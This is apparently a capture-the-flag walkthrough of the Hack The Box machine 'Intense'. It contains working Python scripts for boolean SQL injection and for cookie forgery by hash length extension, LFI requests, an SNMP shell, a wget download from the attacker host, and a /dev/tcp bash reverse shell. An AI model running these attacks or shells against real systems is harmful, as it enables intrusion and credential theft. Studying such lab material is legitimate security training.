nmap scan

```bash
sudo nmap -p- --min-rate 10000 -oA nmap 10.10.10.195
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Enumerating port 80

There's have this website

![image1](/assets/images/htb-intense/intense1.png)

After logging in with guest there's welcome message and a submit button:

![image2](/assets/images/htb-intense/intense2.png)

![image3](/assets/images/htb-intense/intense3.png)

We can send messages, I'll try sql injection:

![image4](/assets/images/htb-intense/intense4.png)

![image5](/assets/images/htb-intense/intense5.png)

### Exploiting boolean sql injeciton

By this error messages it's a sqlite database, trying boolean injection in which you send characters to extract the username, if the response is `OK` it means that the characters isn't correct, but if it's correct is going to be `not authorized`.
We logged in as guest, so test with it:

![image6](/assets/images/htb-intense/intense6.png)

![image7](/assets/images/htb-intense/intense7.png)

With this you can make a script to get users, but you can get the password too, for this you need another query, before I guessed that it was username but we have to source code of the webpage so I can download it and then go to `app/utils.py` and there's a `try_login(form)` that tells that it's needed:

![image8](/assets/images/htb-intense/intense8.png)

Now you can make a query like:

```sql
''||(select secret from users where username = 'guest' and substr(secret,<POSITION>),1) = '<CHARACTER BRUTEFORCE>' and load_extension('a'))||''
```

And the script would be like this:

```python
import requests
import sys

def get_pass(user):
    password = ''
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    charset = "abcdef0123456789"
    for i in range(64):
        for char in charset:
            sys.stdout.write(f"\rPassword: {password}{char}")
            sys.stdout.flush()

            response = requests.post("http://10.10.10.195/submitmessage",data=f"message='||(select secret from users where username = '{user}' and substr(secret, {i+1},1) = '{char}' and load_extension('a'))||'",headers=headers)
            if "not authorized" in response.text:
                password += char
                break

get_pass("admin")
print("\n")
get_pass("guest")
```

```bash
python3 sql-exploit.py
Password for admin: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105

Password for guest: 84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec
```
This script is going to test the password in loop of range of 64 (*Checking the source code the password is stored as a sha256 check utils.py hash_password() function*) and if in response is the message `not authorized` is going to add that character to the password.

### Hash length extension attack

The password was stored as sha256 that is vulnerable to a hash length extension attack, the cookie is like this:

```bash
echo "dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.b+iO9q3nTSdpS2i4in18SDhHzusauD5Ag9iOCBMrbbw=" | cut -d. -f1 |
 base64 -d
username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;
```

```bash
echo "dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.b+iO9q3nTSdpS2i4in18SDhHzusauD5Ag9iOCBMrbbw=" | cut -d. -f2 | base64 -d | xxd -p | tr -d '\n'
6fe88ef6ade74d27694b68b88a7d7c483847ceeb1ab83e4083d88e08132b6dbc
```

Now with the [hash extender tool](https://github.com/iagox86/hash_extender) we can add a new signature for the admin using the hash found before:

```bash
./hash_extender -d 'username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;' -s 6fe88ef6ade74d27694b68b88a7d7c483847ceeb1ab83e4083d88e08132b6dbc -a';username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;' -f sha256 --secret-min=8 --secret-max=15
```

Now the output gives 15 cookies to test each one I make a script that gets the cookie, uses hash extender with the cookie and test if it is valid:

```python
import requests
import base64
import subprocess
import binascii

# 1 - Get the cookie

data = {"username":"guest","password":"guest"}
headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}

sessions = requests.Session()
sessions.post("http://10.10.10.195/postlogin",data=data,headers=headers)
cookie = binascii.hexlify(base64.b64decode(sessions.cookies.get_dict()['auth'].split('.')[1]))

cmd = f"./hash_extender --secret-min 8 --secret-max 15 --data username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec; --signature {cookie} -f sha256 --table --append ;username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;"

out = subprocess.check_output(cmd.split(" ")).strip().decode().split("\n")

for guess in out:
    new_cookie_p1 = base64.b64encode(binascii.unhexlify(guess.split(" ")[-1])).decode()
    new_cookie_p2 = base64.b64encode(binascii.unhexlify(guess.split(" ")[-2])).decode()
    new_cookie = f"{new_cookie_p1}.{new_cookie_p2}"

    response = requests.get("http://10.10.10.195/admin", cookies=dict(auth=new_cookie),)
    if not "403" in response.text:
        print(f"Cookie found: {new_cookie}")
        break
```

After running it:

```bash
python3 cookier.py 
Cookie found: dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADCDt1c2VybmFtZT1hZG1pbjtzZWNyZXQ9ZjFmYzEyMDEwYzA5NDAxNmRlZjc5MWUxNDM1ZGRmZGNhZWNjZjgyNTBlMzY2MzBjMGJjOTMyODVjMjk3MTEwNTs=.xKkIQ6KSq82U4wShUpSwJeUpPa9oq7Dq7AlejEpoH18=
```

### Abusing the admin API

Now with the cookie you are administrator and you can access to the `/admin`

![image9](/assets/images/htb-intense/intense9.png)

In the source code was a `admin.py`:

![image10](/assets/images/htb-intense/intense10.png)

There are two functions:

1. Make a POST request to `/admin/log/view` and as data add `logfile=` with the file you want to view (It's vulnerable to LFI):

![image11](/assets/images/htb-intense/intense11.png)

2. Make a POST request to `/admin/log/dir` and as data add `logdir=` with the directory you want to view:

![image12](/assets/images/htb-intense/intense12.png)

At the end of `/etc/passwd` there's `Debian-snmp` so there's snmp open on UDP (Could have knewn this before if I did a udp scan)

Checking the `/etc/snmp/snmpd.conf` config file there's a community string: 

![image13](/assets/images/htb-intense/intense13.png)

`SuP3RPrivCom90`

### SNMP Shell

With this you can execute commands, but I'll get a shell with [snmp-shell](https://github.com/mxrch/snmp-shell)

```bash
rlwrap python3 shell.py 10.10.10.195 -c SuP3RPrivCom90

Debian-snmp@intense:/$
```

### Enumerating the box to find privesc vectos

On `/home/user` there's: `note_server` and `note_server.c`:

```bash
Debian-snmp@intense:/home/user$ ls -l
total 24
-rwxrwxr-x 1 user user 13152 Nov 16  2019 note_server
-rw-r--r-- 1 user user  3928 Nov 16  2019 note_server.c
```

Let's see if this binary is running:

```bash
netstat -tulnp
(No info could be read for "-p": geteuid()=111 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5001          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:161             0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:45426           0.0.0.0:*                           -  
```

And it's probably the one running on port 5001, to see if this is useful to escalate privileges I'll check if this is running as root:

```
ps -eaf | grep note
root       1023      1  0 14:21 ?        00:00:00 /home/user/note_server
Debian-+   2462   2460  0 15:31 ?        00:00:00 grep note
```

It is, so you'll have to exploit this binary to escalate privileges.

### Unintented Privilege Escalation

There's a unintended way (thanks to [snowscan](https://snowscan.io/htb-writeup-intense/#)!).

This user had the shell set to `/bin/false` but we can get a shell,for this I'll drop a `ed25519` ssh public key (the snmp has a limitation when sending characters this key is shorter)

```
ssh-keygen -o -a 100 -t ed25519 -f mykey
```

I'll set up a server to download the key and download it:

```
Debian-snmp@intense:/dev/shm$ wget http://10.10.14.8/temp
```

Now go to `/var/lib/snmp/.ssh` and redirect the ouput of the key to `authorized_keys`:

```
Debian-snmp@intense:/var/lib/snmp/.ssh$ cat /dev/shm/temp >> authorized_keys
```

And the port forward with ssh:

```
ssh -N -R 4444:127.0.0.1:4444 Debian-snmp@10.10.10.195 -i mykey
```

Then start a listener:

```
rlwrap nc -lvnp 4444
```

Execute the `/dev/tcp` reverse shell:

```
Debian-snmp@intense:/var/lib/snmp/.ssh$ bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
```

And I get the shell back:

```
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 47242
bash: cannot set terminal process group (1178): Inappropriate ioctl for device
bash: no job control in this shell
Debian-snmp@intense:/var/lib/snmp/.ssh$
```

Now you can create a snmpd config file at `/var/lib/snmp/smpd.local.conf` with the useragent root and with the snmp shell execute:

```bash
bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
```
